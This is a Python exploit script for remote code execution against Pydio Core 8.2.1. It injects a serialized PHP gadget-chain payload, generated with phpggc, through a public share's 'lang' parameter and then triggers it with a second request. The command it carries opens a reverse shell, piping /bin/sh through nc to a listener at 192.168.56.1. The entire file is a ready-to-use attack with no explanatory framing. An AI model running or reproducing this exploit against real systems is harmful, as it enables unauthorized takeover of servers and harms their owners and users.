import urllib
import requests

PYDIO_SERIAL_MARKER="$phpserial$"

# Set your own values here
public_share_url="http://192.168.56.106/pydio-core-8.2.1/public/"
shareid="eeebbb"
function="exec"
args="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f"


# Generated with ./phpggc -u Pydio/Guzzle/RCE1 FUNCTION "CMD"
# Patch the payload with function and args values and lengths
payload="O%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A2%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00methods%22%3Ba%3A1%3A%7Bs%3A10%3A%22__toString%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A39%3A%22Pydio%5CCore%5CController%5CShutdownScheduler%22%3A1%3A%7Bs%3A50%3A%22%00Pydio%5CCore%5CController%5CShutdownScheduler%00callbacks%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A" + str(len(function)) + "%3A%22" + urllib.parse.quote(function) + "%22%3Bi%3A1%3Bs%3A" + str(len(args)) + "%3A%22" + urllib.parse.quote(args) + "%22%3B%7D%7D%7Di%3A1%3Bs%3A22%3A%22callRegisteredShutdown%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A4%3Bi%3A1%3Bs%3A22%3A%22callRegisteredShutdown%22%3B%7D%7D"

r = requests.get(public_share_url + shareid + "?lang="  + PYDIO_SERIAL_MARKER + payload)
cookies = r.cookies

# Call  'http:///192.168.56.106/pydio-core-8.2.1/public/?get_action=get_boot_conf&minisite_session=SHAREID' to trigger the payload (via __toString()) 
r = requests.post(public_share_url + "?get_action=get_boot_conf&minisite_session=" + shareid, cookies=cookies)

